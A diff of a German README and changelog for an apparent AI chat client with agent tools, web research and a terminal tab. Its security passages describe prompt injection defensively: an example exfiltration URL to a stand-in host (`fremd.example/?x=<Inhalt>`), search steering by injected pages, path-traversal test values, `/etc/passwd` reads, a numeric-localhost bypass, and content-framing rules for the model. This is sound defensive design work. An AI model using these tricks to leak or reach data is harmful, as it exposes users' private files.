@@ -1,7 +1,7 @@
 # client (Nutzer-Client inkl. Wallet)
 
-> **Version:** 0.59.1 (`myl-client` 0.44.1, `myl-oberflaeche` 0.39.1, `myl-console` 0.13.0, `myl-senses` 0.2.0)
-> **Datum:** 2026-09-22
+> **Version:** 0.72.0 (`myl-client` 0.52.0, `myl-oberflaeche` 0.43.0, `myl-console` 0.15.0, `myl-senses` 0.7.0)
+> **Datum:** 2026-09-23
 > **Status:** ✅ **Der lokale Betrieb läuft und ist ausgeliefert.** Ein
 > Gesprächsfenster mit Modellwahl, Agentenschleife und
 > Einstellungsseite; aus einem frischen Klon lassen sich darüber
@@ -51,7 +51,7 @@ kostet nichts, wenn er stimmt, und einen halben Tag, wenn nicht.
 | **Gespraeche verwalten** | Rechtsklick auf eine Zeile: umbenennen an Ort und Stelle, als Markdown ausgeben, loeschen. Wohin ausgegeben wird, steht in `ausgabe.ordner`; ohne Angabe fuehrt das Fenster dorthin |
 
 ⚑ **Die Oberfläche ruft dieselben Funktionen wie die Kommandozeile**,
-über zweiunddreissig Befehle, und startet **keinen einzigen Unterprozess**. `jeder_befehl_ist_angemeldet` hält die vier
+über fünfunddreissig Befehle. ⚠️ **Mit genau einer Ausnahme, und sie ist gewollt:** `terminal_ausfuehren` startet eine Shell, denn ein Terminal, das keine startet, ist keines. Jeder andere Befehl startet **keinen einzigen Unterprozess**. `jeder_befehl_ist_angemeldet` hält die vier
 Richtungen zusammen: kein Befehl ohne Anmeldung, keine Anmeldung ohne
 Befehl, kein Aufruf ins Leere und kein Befehl, den niemand ruft. „Ohne eigene Logik" hiesse sonst, aus einer Textausgabe
 für Menschen eine Schnittstelle zu machen, und genau das ist die Sorte
@@ -106,10 +106,41 @@ Betriebssystem** (Punkt 3.1). Das ist der Unterschied zwischen einer
 Zusage und einer Sicherung, und er steht hier, weil er sonst niemandem
 auffällt.
 
+### Fremder Text aus dem Web
+
+Die Recherchewerkzeuge des Chats sind abgeschaltet, bis das Häkchen
+„Im Web recherchieren dürfen" gesetzt ist. Sind sie an, gilt:
+
+* Gelesen wird **nur**, was aus einem Suchtreffer stammt, was der
+  Nutzer selbst genannt hat, oder was auf einer schon gelesenen Seite
+  als Verweis **auf denselben Wirt** stand. Eine vom Modell
+  zusammengesetzte Adresse wird abgewiesen, bevor ein Abruf läuft.
+  ⛔️ **Damit ist die Adresszeile kein Abflussrohr**, und das ist der
+  Weg nach draussen, den eine eingeschleuste Anweisung sonst nimmt. Der
+  geerntete Verweis ändert daran nichts: Er steht wörtlich in der
+  Seite, und wer ihn ändert, ist nicht mehr im Zielkreis.
+* Eine Suchfrage, die einen wörtlichen Abschnitt aus einem Anhang
+  enthält, wird abgelehnt.
+* Nur `https`, kein Anmeldeteil, kein fremder Port, nichts im eigenen
+  Netz; geprüft vor dem Abruf und noch einmal auf dem Ziel jeder
+  Umleitung.
+* Seitentext kommt **eingefasst** zurück, mit der Ansage vorn und
+  hinten, dass er Inhalt ist und keine Anweisung. Die Rahmenzeichen
+  werden im Inhalt ersetzt, damit keine Seite den Rahmen von innen
+  schliessen kann.
+* Zwölf Abrufe je Rüstung, zwanzig Sekunden und zwei Megabyte je
+  Abruf.
+
+⚠️ **Im vollen Agentenbetrieb gibt es sie nicht.** Dort steht mit
+`run_command` bereits ein Weg nach draussen offen, den keine dieser
+Schranken einfasst.
+
 ## Abhängigkeiten
 
 `INTEGER_LLM` (Laufzeit und Artefakte), `AGENT_LAYER` (Werkzeugansage
-und Session-Kontrakte). Für die Netzhälfte zusätzlich: `CONSENSUS`
+und Session-Kontrakte). ⚑ **Fremdprogramme sind keine Baubedingung:**
+`curl` trägt die Web-Recherche, und fehlt es, fehlen die beiden
+Werkzeuge und sonst nichts. Für die Netzhälfte zusätzlich: `CONSENSUS`
 (Ledger-Zustand lesen), `TOKENOMICS` (Burn- und Mint-Fluss,
 Credit-Preis), `NETWORKING` (Gateway), `GOVERNANCE` (Abstimmung).
 
@@ -120,6 +151,726 @@ Modell überhaupt etwas taugt, und weil eine Schnittstelle, die kein
 Mensch je bedient hat, an den Bedürfnissen vorbei entworfen wird.
 
 ## Changelog
+
+### v0.72.0 – 2026-09-23 (ein Terminal im Fenster, und es gehört dem Menschen)
+
+**Auftrag des Projektinhabers:** ein Reiter mit Terminal, unter
+„Wallet" in der linken Leiste.
+
+⛔️ **Hier wird eine Grenze bewusst nicht gezogen, und das steht an
+drei Stellen im Quelltext.** Überall sonst fasst die Einhängegrenze
+ein, was laufen darf: `write_file` kommt nicht aus dem Arbeitsordner
+heraus, ein Manifest braucht die Schreiberlaubnis, `run_command` gibt es
+im Chat gar nicht. **Dieses Terminal hat keine dieser Schranken.** Es
+führt aus, was dasteht, mit den Rechten des Nutzers.
+
+⚑ **Der Unterschied ist, WER tippt.** Jede Schranke im Client schützt
+vor einem **Modell**, das sich irrt oder das ein fremder Text in die
+Irre führt. Ein Mensch, der ein Terminal öffnet, hat genau das gewollt,
+und ihm dieselben Fesseln anzulegen hiesse, ihm ein Terminal zu geben,
+das keines ist.
+
+⛔️ **Also: Das Modell kommt hier nicht heran.** `terminal_ausfuehren`
+steht in keinem Werkzeugkasten, wird von keiner Rüstung angeboten und
+kann von keiner Agentenschleife gerufen werden. Wer ihn je als Werkzeug
+anmeldet, macht aus dem Chat einen Vollzugriff.
+
+⚑ **`cd` wird selbst behandelt und nicht an die Shell gegeben.** Jeder
+Aufruf startet eine eigene Shell; ein `cd` darin wäre mit ihrem Ende
+wieder weg. Der Ordner lebt deshalb im Fensterzustand und überlebt
+jeden Befehl. Aufgelöst wird er mit `canonicalize`, sonst stünde nach
+zweimal `cd ..` ein Pfad mit Punkten im Prompt.
+
+⚑ **Kein Terminalemulator, sondern ein Befehlsläufer.** `TERM=dumb` und
+`NO_COLOR=1`: Eine Ausgabe mit ANSI-Folgen sähe im Fenster aus wie
+Kauderwelsch. Damit laufen `ls`, `git`, `grep` und `cargo`, aber nichts
+Interaktives wie `vim` oder `top`. Das ist eine Zusage, die eingehalten
+wird, statt einer, die halb eingelöst aussieht.
+
+⚑ **Die Ausgabe geht über `textContent` und nie über `innerHTML`.** Sie
+ist fremder Text; wer sie als Markup einsetzt, lässt jede Datei im
+Dateisystem in das Fenster hineinschreiben. Frist 300 s (großzügig,
+denn ein Mensch tippt auch `cargo build`), Ausgabe bei 40 000 Zeichen
+gekürzt, Pfeiltasten blättern durch das Getippte.
+
+📌 **Drei Proben haben sofort zugeschlagen, und alle drei zu Recht:**
+`die_farben_sind_graustufen` fand ein `#e06c6c`,
+`das_helle_thema_dreht_den_lichtkanal` eine feste Farbe statt eines
+Kanals, und `jeder_befehl_ist_angemeldet` die Zahl im Kopf dieses
+Dokuments.
+
+⚠️ **Und eine Angabe war durch den Reiter falsch geworden:** Hier stand
+„startet **keinen einzigen Unterprozess**". Ein Terminal, das keine
+Shell startet, ist keines. Der Satz nennt die Ausnahme jetzt beim
+Namen, statt dass sie ihn stillschweigend widerlegt.
+
+⚑ **Und wozu das Ganze über das Fenster hinaus:** Ein System ohne
+Desktop hat keinen Dateimanager, keinen Editor, keine Konsole. Bringt
+das Fenster ein Terminal mit, genügt es dort **allein**. Das ist die
+Voraussetzung für einen Kioskbetrieb.
+
+**Belegt:** 64 Proben der Oberfläche grün, Clippy ohne Befund.
+
+### v0.71.0 – 2026-09-23 (PDF, alle gängigen Formate, und eine Schranke, die die falsche Frage stellte)
+
+**Zwei Aufträge des Projektinhabers**, und beim ersten war die
+Entscheidung an mich delegiert.
+
+#### Schranke 2 gelockert, und zwar in der Bauform statt in der Zahl
+
+⚑ **Der Denkfehler war nicht die Zahl, sondern die Frage.** Eine
+Zeichenlänge kann „diktiertes Kennwort" und „exakter Papiertitel" nicht
+trennen, denn beide sind wörtliche Übernahmen; jede andere Zahl hätte
+nur verschoben, wo die Schranke danebengreift. **Gemessen:** In drei von
+fünf Läufen mit dem 4B traf sie eine echte Recherchefrage.
+
+Jetzt gilt: Die Frage geht hinaus, die Treffer kommen zurück, **ihre
+Adressen kommen aber nicht in den Zielkreis**. ⛔️ **Damit bleibt der
+Angriff zu, den es wirklich gibt:** Eine Seite diktiert eine Frage mit
+einem einmaligen Kennwort, damit der Suchdienst genau ihre zweite Seite
+liefert. Sie wird geliefert und ist als Auszug lesbar, abrufbar ist sie
+nicht, und mit eigenen Worten findet das Modell sie nie wieder, denn das
+Kennwort ist der einzige Weg dorthin.
+
+⚑ **Was die Lockerung trägt:** Über die Suchfrage kann nichts Privates
+abfliessen, das fängt die Anhangprobe, und die bleibt ein Verbot. Der
+gelesene Seitentext ist nie privat, denn Schranke 5 sperrt das eigene
+Netz, und es gehen weder Kekse noch eine Anmeldung mit hinaus.
+
+#### PDF und die übrigen Formate
+
+⛔️ **Der gemeldete Inhaltstyp entscheidet, nicht die Endung.** Eine
+Adresse sagt nichts darüber, was hinten herauskommt; der Kopf der
+Antwort schon. Wo er schweigt oder lügt, sieht die Signatur nach:
+Manche Server schicken ein PDF als `application/octet-stream` oder gar
+als `text/html`.
+
+* HTML und XHTML: Marken raus, Skript, Stil und Kopf ganz weg.
+* XML, RSS, Atom: dasselbe.
+* `text/*` und JSON: **wörtlich durch**. ⚑ Wer JSON durch die
+  Markenentfernung schickt, bekommt zerstückeltes JSON, denn `<` und
+  `>` kommen darin vor.
+* PDF: ein eigenes Programm, siehe unten.
+* Alles andere: eine Absage, die den Typ **nennt**.
+
+Neu: `CLIENT/myl-senses/src/schrift.rs`. ⚑ **Es liegt bei den Sinnen und
+nicht beim Recherchewerkzeug**, weil derselbe Handgriff auch für einen
+Anhang gebraucht wird: Ein Mensch hängt ein PDF an und will, dass das
+Modell es liest.
+
+⚑ **Ein fremdes Programm und keine eigene Zerlegung.** Ein PDF trägt
+seinen Text in Strömen, die fast immer gepackt sind, und die Zuordnung
+von Zeichen zu Buchstaben hängt an eingebetteten Schriften, an
+CID-Tabellen und an `ToUnicode`. Das ist keine Nachmittagsarbeit, und
+**ein halb richtiger Auszug ist schlimmer als keiner: Er sieht aus wie
+Text.**
+
+Rangfolge: `MYL_SCHRIFTLESER`, `pdftotext`, `mutool`, zuletzt ein
+Python, das `pypdf` oder `fitz` **wirklich** hat. ⚠️ **Das Nachsehen ist
+der Punkt:** Ein Python ohne die Bibliothek wäre ein Zeug, das beim
+ersten Auftrag versagt, und das ist schlimmer als keines. `myl sinne`
+zeigt den gefundenen Weg in der Zeile `Schrift`.
+
+Zwei Zahlen mussten mit: Die Holgrenze stand auf zwei Millionen Bytes
+und hätte jedes PDF abgeschnitten (der geprüfte Artikel wiegt 8,7 MB),
+die Frist auf 20 Sekunden. Jetzt 20 MB und 30 s. ⚑ **Was geholt wird
+und was ins Fenster geht, sind zwei verschiedene Zahlen**; die zweite
+bleibt bei 12 000 Zeichen.
+
+⚑ **Und `ist_beiwerk` hängt jetzt von diesem Rechner ab.** Liegt ein
+Programm zum Lesen von PDF, ist ein PDF ein Volltext und gehört in den
+Zielkreis; liegt keines, ist es eine Zusage, die niemand einlösen kann.
+
+**Belegt:** ein Lauf gegen das echte Netz, der den Artikel als PDF holt
+und den Titel im Auszug findet, und ein Lauf mit dem 4B, der aus
+`https://arxiv.org/pdf/2405.17849v2` in **einem** Schritt die drei
+Verfahren der Arbeit nennt (FSBR, DI-MatMul, die drei ganzzahligen
+Operatoren). Proben und Clippy grün in allen vier Client-Kisten.
+
+### v0.70.0 – 2026-09-23 (drei Funde, alle vom Modell gefunden, keiner von einer Probe)
+
+Die mehrstufige Recherche aus v0.69.0 war gebaut, geprüft und grün, und
+sie funktionierte trotzdem nicht. **Gefunden hat das erst ein Lauf mit
+dem 4B.** 📌 **Eine Probe prüft, ob die Maschine tut, was ich meinte.
+Ob das Modell damit arbeiten kann, prüft nur das Modell.**
+
+⛔️ **Fund 441: eine Erlaubnis ohne den Gegenstand.** Unter der Seite
+stand „übernimm einen der Verweise wörtlich aus dem Text oben", und im
+Text stand keiner: Verweise leben in `href`-Attributen, und die sind
+nach dem Entfernen der Marken weg. Das Modell hat daraufhin dieselbe
+Seite viermal gelesen und ist dann auf die Suche ausgewichen. Jetzt
+stehen bis zu 20 Adressen am Ende des Blocks. ⚑ **Sie stehen IM
+Rahmen**, denn sie stammen aus der Seite und sind fremder Inhalt; die
+Erlaubnis, sie zu lesen, steht **ausserhalb**, denn die ist unsere.
+
+⛔️ **Fund 442: vier Abrufe für denselben Text.** Eine wiederholte
+Adresse bekommt jetzt eine Absage statt eines zweiten Abrufs, und der
+Zähler steht dabei still. Ohne das frisst eine Schleife das Budget von
+zwölf Abrufen an einer einzigen Seite auf.
+
+⛔️ **Fund 443: nicht jedes PDF trägt `.pdf`.** Der Endungsfilter liess
+`https://arxiv.org/pdf/2405.17849` durch, das Modell hielt die Adresse
+für einen Volltext und verbrannte drei Schritte an „kein lesbarer
+Text". Ein Pfadabschnitt, der genau `pdf` heisst, zählt jetzt ebenso.
+⚑ **Was dieses Werkzeug nicht lesen kann, gehört nicht ins Angebot,
+denn ein Angebot ist eine Zusage.** Wird doch eines angefragt, sagt die
+Absage, **was** es ist; „kein lesbarer Text" lädt zum Wiederholen ein,
+„das ist ein PDF" nicht.
+
+Dazu fällt Beiwerk schon bei der Ernte heraus (Stilblätter, Skripte,
+Bilder, Archive): Von fünfzehn gezeigten Adressen einer arxiv-Seite
+waren sechs Stilblätter, und jede belegte einen Platz im Zielkreis.
+
+**Belegt, mit dem 4B und dem vollen Weg:** `web_read` auf die
+Artikelseite, dann `web_read` auf
+`https://arxiv.org/search/cs?searchtype=author&query=Hu,+X`, **eine
+Adresse, die nur aus der Ernte stammen kann** (kein Suchtreffer, vom
+Nutzer nicht genannt), dann die Antwort mit zwei Titeln aus der
+Trefferliste. 215 Proben der Kiste grün, Clippy ohne Befund.
+
+### v0.69.0 – 2026-09-23 (mehrstufige Recherche, ohne dass der Zielkreis aufgeht)
+
+**Auf Festlegung des Projektinhabers:** Der geschlossene Zielkreis aus
+v0.68.0 machte mehrstufige Recherche unmöglich. Das Modell konnte einer
+Seite nicht folgen, die auf die nächste verweist, und musste stattdessen
+neu suchen. Jetzt wächst der Zielkreis auch aus **Verweisen einer schon
+gelesenen Seite, aber nur auf demselben Wirt**.
+
+⚑ **Die Dichtigkeit kommt aus der Wörtlichkeit, nicht aus dem Wirt**,
+und das ist der Satz, auf den es ankommt. Ein geernteter Verweis steht
+**wörtlich** so in der Seite, und ihr Verfasser kennt die Anhänge des
+Nutzers nicht. Um ein Geheimnis anzuhängen, müsste das Modell die
+Adresse **ändern**, und eine geänderte Adresse steht nicht mehr im
+Zielkreis. 📌 **Das gehört ausgesprochen**, weil sonst der Trugschluss
+naheliegt, derselbe Wirt sei eine Vertrauensgrenze: Auf einer Seite mit
+fremden Beiträgen, einer Code-Ablage, einem Forum, einem Wiki, ist er
+das gerade nicht.
+
+⚑ **Wozu dann die Wirtsgrenze?** Nicht gegen Abfluss, sondern gegen
+**Lenkung.** Ohne sie schickt eine präparierte Seite den Agenten auf
+jeden anderen Wirt ihrer Wahl. Mit ihr bleibt er auf dem, den ein Mensch
+oder ein Suchtreffer ohnehin benannt hat.
+
+⚑ **Derselbe Wirt heisst: gleich, oder nur um ein führendes `www.`
+verschieden.** Mehr nicht. `blog.example.org` ist nicht `example.org`,
+denn eine Unterdomäne kann einem anderen gehören. Der nächste Schritt
+wäre die registrierbare Domäne, und dafür braucht es die Liste der
+öffentlichen Endungen, also eine Fremdkiste und eine Datei, die
+veraltet.
+
+Geerntet wird aus dem rohen HTML und nicht aus dem gekürzten Text (ein
+Verweis steht im Attribut, und der Schnitt bei 12 000 Zeichen nähme ihn
+mit), gegen das **Ziel der Umleitung** und nicht gegen die angefragte
+Adresse, und höchstens 60 je Seite. Aufgelöst werden absolute,
+schemalose, wurzelbezogene und einfache Verweise; `http:`, `mailto:`,
+`javascript:` und ein blosser Sprung im Dokument fallen heraus.
+
+⚠️ **Die Seite sagt dem Modell, dass es weiterlesen darf.** Unter dem
+Text steht, wie viele Verweise jetzt lesbar sind. Eine Fähigkeit, die
+niemand ansagt, wird nicht benutzt; stattdessen erfindet ein kleines
+Modell eine Adresse und bekommt eine Absage.
+
+📌 **Ein Fehler in der eigenen Probe gefunden:** `gleicher_wirt` schnitt
+`www.` ab, **bevor** es kleinschrieb, also blieb `WWW.` stehen. In der
+Anwendung hätte es nie gegriffen, weil beide Wirte aus derselben
+kleinschreibenden Prüfung kommen; in einer öffentlichen Funktion ist es
+trotzdem eine Falle.
+
+**Belegt:** fünf neue Proben, darunter der geänderte Verweis, der kein
+Verweis mehr ist, und die Wirtsgrenze gegen `boese.example` und
+`blog.arxiv.org`. Dazu der Lauf gegen das echte Netz: 39 Verweise auf
+`arxiv.org` geerntet, zweite Stufe gelesen. 21 Proben im Modul, 213 in
+der Kiste, Clippy ohne Befund.
+
+### v0.68.0 – 2026-09-23 (der Chat darf recherchieren, und fremder Text bekommt einen Rahmen, den er nicht aufmachen kann)
+
+**Dritter Teil des Auftrags:** Werkzeuge für Web-Recherche, mit
+maximalem Schutz gegen eingeschleuste Anweisungen.
+
+⛔️ **Das Bedrohungsbild in einem Satz.** Angreifbar wird ein Agent, der
+**eigene Daten**, **fremden Text** und **einen Weg nach draussen**
+zugleich hat. Recherche bringt den fremden Text zwangsläufig mit, und
+die Anhänge stehen im selben Fenster. **Also fällt die ganze Last auf
+den Weg nach draussen**, und genau dort setzen die Schranken an.
+
+⛔️ **Der Zielkreis ist geschlossen.** `web_lesen` nimmt nur eine
+Adresse an, die vorher schon im Tor stand: entweder vom Nutzer selbst
+geschrieben oder aus einem Suchtreffer. Eine Adresse, die das Modell
+frei zusammensetzt, wird abgewiesen, **bevor** ein Abruf läuft.
+📌 **Das ist der Kanal, an den zuerst niemand denkt:**
+`https://fremd.example/?x=<Inhalt>` trägt alles hinaus, was im Fenster
+steht, und sieht dabei aus wie ein gewöhnlicher Seitenaufruf.
+
+⛔️ **Die Suchfrage geht frei hinaus, also wird sie geprüft.** Enthält
+sie einen wörtlichen Lauf von 24 Zeichen aus einem Anhang, wird sie
+abgelehnt. Verglichen wird über eine normalisierte Fassung, damit ein
+eingefügter Zeilenumbruch die Probe nicht aushebelt. Ein zweiter,
+längerer Lauf (48 Zeichen) fängt den Fall ab, dass eine gelesene Seite
+dem Modell die nächste Suche diktiert.
+
+⚑ **Zeitliche Trennung.** Das Tor füllt sich **vor** dem ersten
+Fremdtext und wächst danach nur aus Suchen, die ihrerseits durch die
+Verratsprobe gegangen sind. Eine gelesene Seite kann den Agenten damit
+nicht auf ein Ziel ihrer Wahl schicken.
+
+⛔️ **Der Rahmen lässt sich nicht von innen schliessen.** Jeder Abruf
+kommt eingefasst zurück, mit der Ansage **vorn und hinten**, und die
+beiden Rahmenzeichen werden im Inhalt selbst ersetzt. 📌 **Ohne das
+zweite ist das erste wertlos:** Eine Seite, die den Rahmen schliesst
+und einen eigenen aufmacht, spricht sonst mit der Stimme des Systems.
+Die Ansage steht auch am Ende, weil eine Einschleusung sich dorthin
+legt, wo die Regel schon weit weg ist.
+
+⛔️ **Kein Zugriff auf das eigene Netz.** Nur `https`, kein Anmeldeteil
+in der Adresse, kein anderer Port als 443, kein Namensliteral, das eine
+Adresse ist, nichts auf `localhost`, `.local`, `.lan` oder `.internal`,
+und auch kein reines Zahlenziel (`https://2130706433/` ist 127.0.0.1
+und besteht jede Adressprüfung, weil es keine Adresse ist). Geprüft
+wird zweimal: vor dem Abruf und noch einmal auf dem Ziel der Umleitung.
+
+⚑ **Skript, Stil und Kopf fliegen ganz heraus**, nicht nur ihre Marken:
+Was ein Leser nie sieht, ist der bequemste Platz für eine
+Einschleusung.
+
+⚑ **`curl` statt einer HTTP-Kiste**, aus demselben Grund wie im Agent
+Layer: `reqwest` zöge `tokio`, `hyper` und `rustls` herein, und hier
+wäre es ausgerechnet die Kiste, die den fremden Text anfasst. `curl`
+liegt auf allen drei Zielsystemen, läuft in einem eigenen Prozess, und
+fehlt es, fehlen die beiden Werkzeuge und sonst nichts. ⚠️ **`-q` steht
+als erstes Argument**, sonst liest `curl` `~/.curlrc`, und dort könnte
+ein Proxy oder ein Keksglas stehen, das dieses Modul nie gesehen hat;
+`--` steht vor der Adresse, damit eine Adresse mit führendem Strich
+kein Schalter wird.
+
+⚠️ **Nur im Chat, nicht im vollen Agentenbetrieb.** Dort steht mit
+`run_command` bereits ein Weg nach draussen offen, den keine dieser
+Schranken einfasst; ein Suchwerkzeug daneben wäre die Schranke an einer
+Tür, neben der keine Wand steht.
+
+⚑ **Abgeschaltet, bis der Nutzer es einschaltet:** neues Häkchen
+`agent.web_recherche` unter der Rubrik „Agent". Ist es gesetzt, geht
+der Chat auch **ohne** Anhang durch die Werkzeugschleife, denn ein
+Suchwerkzeug, das nur neben einer angehängten Datei da wäre, fehlte
+genau dann, wenn man es braucht.
+
+📌 **Fund 440: `<head` traf `<header`.** Der Kopfbereich wurde
+herausgeschnitten, indem von `<head` bis `</head>` alles entfernt
+wurde. Auf einer Seite mit `<header>` griff die Marke dort erneut,
+fand danach kein `</head>` mehr und frass den Rest der Seite. Von
+arxiv.org blieb „Skip to main content". ⚑ **Eine Marke endet am
+Namen:** Hinter dem gesuchten Namen darf kein weiterer Namensbuchstabe
+stehen.
+
+⚑ **Neu: `myl agent --chat`.** Er fährt von der Kommandozeile genau
+den Zuschnitt, den das Fenster im Gespräch fährt: Werkzeuge nur auf dem
+Anhangordner, dazu die Recherche, falls sie an ist. 📌 **Ohne ihn liesse
+sich der Chatzuschnitt nur durch das Fenster prüfen**, also nur von Hand
+und nur auf einem Rechner mit Oberfläche.
+
+**Mit dem 4B und einem echten Auftrag belegt:** `web_search` mit eigener
+Frage, `web_read` auf eine Adresse aus dem Treffer, richtige Antwort aus
+der Seite. ⚠️ **Nicht belegt ist, ob ein Modell einer eingeschleusten
+Anweisung widersteht;** dafür müsste eine Seite unter eigener Kontrolle
+über `https` erreichbar sein, und die Schranke gegen das eigene Netz
+verbietet genau das. ⚑ **Der Entwurf baut auch nicht darauf:** Der
+Rahmen ist die einzige Schicht, die vom Modell abhängt, und er ist die
+letzte, nicht die erste.
+
+Nebenbei: `myl einstellungen` schrieb `agent.blick_bildschirmfalse`, die
+Namensspalte stand fest auf 21 Zeichen. Sie kommt jetzt aus der Feldliste
+selbst.
+
+**Belegt:** 16 Proben im Modul, darunter zehn gesperrte Ziele im
+eigenen Netz, der Rahmen, der sich nicht von innen schliessen lässt,
+die Verratsprobe über einen Zeilenumbruch hinweg, kurze Fragen, die
+nie durchfallen, und ein Suchtreffer ins eigene Netz, der gar nicht
+erst in den Zielkreis kommt. Dazu ein gesperrter Lauf gegen das echte
+Netz (`cargo test --lib netzwerkzeuge -- --ignored`), der Suche und
+Seite von Anfang bis Ende zeigt. 208 Proben der Kiste grün, clippy
+ohne Befund.
+
+### v0.67.0 – 2026-09-23 (der geänderte Anhang kommt zurück, und die Liste ist ein Befund)
+
+**Zweiter Teil des Auftrags:** Ein im Chat geänderter Anhang soll beim
+Menschen landen.
+
+⚑ **Was sich geändert hat, wird gemessen und nicht geglaubt.** Vor und
+nach dem Lauf wird der Anhangordner verglichen, Datei für Datei über
+einen Abdruck des Inhalts. 📌 **Eine Antwort, die sagt „ich habe die
+Datei geändert", ist eine Behauptung des Modells; diese Liste ist ein
+Befund über das Dateisystem.** Ein Modell, das die Änderung nur
+behauptet, taucht darin nicht auf.
+
+⚑ **Der Abdruck und nicht die Änderungszeit.** Eine Zeit sagt
+„angefasst", nicht „anders": Ein Werkzeug, das dieselben Bytes
+zurückschreibt, setzte sie neu, und der Mensch bekäme eine Datei
+angeboten, an der nichts geschehen ist.
+
+⚠️ **Verglichen wird der ganze Ordner**, nicht nur die Anhänge dieses
+Beitrags: Ein Modell, das statt zu ändern eine zweite Datei schreibt,
+hat auch etwas hinterlassen, das der Mensch haben will.
+
+⛔️ **Der Weg hinaus ist ein Knopf und kein Werkzeug.** Die Werkzeuge
+des Chats kommen nicht aus dem Anhangordner heraus; **wohin eine Datei
+geht, entscheidet der Mensch** über den Dialog des Systems. Der neue
+Befehl `anhang_herausgeben` löst den Namen über dieselbe Einhängung auf
+und weist ab, was hinausführt, auch wenn er aus dem eigenen Fenster
+kommt: Ein Befehl, der jeden Pfad nimmt, den ihm jemand nennt, wäre eine
+Tür neben der Tür.
+
+Unter der Antwort steht je geänderter Datei ein Knopf. **Belegt:** eine
+Probe, die `../geheim.txt`, `../../etc/hosts` und einen absoluten Pfad
+abweist und den Anhang selbst durchlässt.
+
+### v0.66.0 – 2026-09-23 (der Chat darf Anhänge bearbeiten, und sonst nichts)
+
+**Auftrag des Projektinhabers:** Der Chat soll Anhänge bearbeiten
+können, **aber keinen Zugriff auf Ordner oder Dateisystem**, und die
+geänderte Datei soll zurückkommen.
+
+⚑ **Der Mechanismus dafür war schon da: die Einhängegrenze.** Neu ist
+nur, dass der Chat sie enger zieht. `ruestung::ruesten_fuer_anhaenge`
+setzt ihre Wurzel auf den **Anhangordner**, und `aufloesen` weist ab,
+was hinausführt. Damit stehen dem Chat neun Werkzeuge zur Verfügung:
+
+| | |
+|---|---|
+| `read_file`, `write_file`, `edit_file`, `list_directory`, `search_files` | auf den Anhangordner begrenzt |
+| `fill_template`, `join_sections` | rechnen aus ihren Eingaben, ohne Dateisystem |
+| `describe_image`, `transcribe_audio` | dieselbe Grenze, auf Anhänge |
+
+⛔️ **Manifest-Werkzeuge bleiben draussen, und das ist der Kern des
+Zuschnitts.** Ein Manifest läuft über eine Shell, und eine Shell kennt
+die Einhängegrenze nicht: `cat ../../../etc/passwd` ginge durch jede
+noch so enge Einhängung hindurch. **Die Grenze hält nur, solange alles,
+was hinter ihr arbeitet, sie kennt.** `run_command` fällt schon über die
+Kiste weg, denn `Base` enthält es nicht.
+
+⚑ **Werkzeuge gibt es genau dann, wenn ein Anhang da ist.** Ohne
+Anhang bleibt der Chat, was er war: Eine Werkzeugansage kostet Kontext,
+und für ein Gespräch ohne Datei gibt es nichts zu bedienen.
+
+⚠️ **Im Chat heisst der Anhang anders**, und das ist keine Kosmetik: Die
+Einhängung sitzt auf dem Anhangordner, also ist `liste.md` der richtige
+Pfad und `.AGENT/anhaenge/liste.md` einer, der dort nicht auflöst. Die
+Anhangzeile nennt deshalb je Betriebsart den passenden.
+
+⚠️ **Vorgelesen wird mit Anhang nicht.** Im Strom der Schleife stehen
+auch Werkzeugaufrufe, und die will niemand vorgelesen bekommen; genau
+mit dieser Begründung war das Sprechen bisher dem Chat vorbehalten.
+
+**Belegt:** zwei Proben, und sie halten die Zusage fest, auf die alles
+ankommt. Die eine liest einen Anhang und weist `../geheim.txt`,
+`../../etc/hosts` und einen absoluten Pfad ab; die andere prüft, dass
+kein Manifest-Werkzeug und kein `run_command` im Kasten steht und die
+fünf Dateiwerkzeuge da sind. Der Zuschnitt mutiert, die Probe fällt und
+nennt, was sonst durchkäme. Dazu ein Lauf mit dem 4B in der
+nachgestellten Chatlage:
+
+```
+→ edit_file aenderungen=[{"alt":"Kaese","neu":"Butter"}] pfad=liste.md
+```
+
+### v0.65.0 – 2026-09-23 (eine angehängte Textdatei versprach im Chat ein Werkzeug, das es dort nicht gibt)
+
+⛔️ **Fund 439, gemeldet vom Projektinhaber.** Eine Textdatei anhängen
+und „bitte ändere sie" sagen ergab eine **Anleitung** statt einer
+Änderung.
+
+**Der Grund ist der Betriebsmodus, und die Anhangzeile hat darüber
+gelogen.** Sie schrieb unbedingt „Der Anfang steht unten; den Rest liest
+`read_file`". Im **Chat** gibt es aber gar keine Werkzeuge, weder
+`read_file` noch `edit_file`. Das Modell konnte die Datei also weder
+lesen noch ändern, und die Nachricht hatte ihm das Gegenteil gesagt.
+
+⚑ **Im Agentenmodus ging es die ganze Zeit.** Nachgestellt, mit dem 4B:
+
+```
+→ edit_file aenderungen=[{"alt":"Kaese","neu":"Butter"}] pfad=.AGENT/anhaenge/liste.md
+```
+
+Die Datei war danach geändert.
+
+**Behoben:** `anhang_aufnehmen` bekommt den Betriebsmodus, wie `kontext`
+ihn schon bekommt, und die Anhangzeile nennt **nur noch Werkzeuge, die
+es im laufenden Betrieb wirklich gibt**. Ohne sie sagt sie das: „mehr
+ist hier nicht zu holen, in diesem Betrieb gibt es keine
+Dateiwerkzeuge". Das gilt für Text ebenso wie für Bild und Ton; ein
+Werkzeugname im Chat ist ein Versprechen ohne Deckung.
+
+📌 **Dieselbe Klasse wie Fund 436, nur andersherum.** Dort behauptete
+die Zeile zu wenig (ein Bild war angesehen und sie sagte, es sei nichts
+zu sagen), hier zu viel.
+
+**Belegt:** eine Probe mit Gegenrichtung, der Zweig mutiert, die Probe
+gefallen.
+
+### v0.64.0 – 2026-09-23 (ein unbekannter Kistenname fällt nicht mehr auf die eingestellte Kiste zurück)
+
+⛔️ **Fund 437.** `myl --werkzeuge <name>` warnte bei einem unbekannten
+Namen und fuhr mit der **eingestellten** Kiste weiter. Wer den Schalter
+setzt, sagt aber gerade, dass die eingestellte nicht gelten soll; er
+bekam damit das Gegenteil dessen, wonach er gefragt hat.
+
+**Gefunden von der Agentenmessung**, die `voll` übergab, weil `myl` nur
+`Base`, `Advanced` und `1337` kennt. Über dem Ergebnis stand
+„Werkzeugsatz: voll", gemessen wurde **Base**, und `run_command` war in
+keinem einzigen Lauf im Angebot. Das Modell antwortete korrekt, es sehe
+keine Funktion für Befehle, und das sah aus wie ein Modellfehler.
+
+⚑ **Jetzt Rückgabewert 2 und kein Modell geladen.** 📌 **Eine Warnung,
+nach der es weitergeht, ist ein Kommentar mit Laufzeit**, und hier
+landete sie in einer Datei, die niemand las.
+
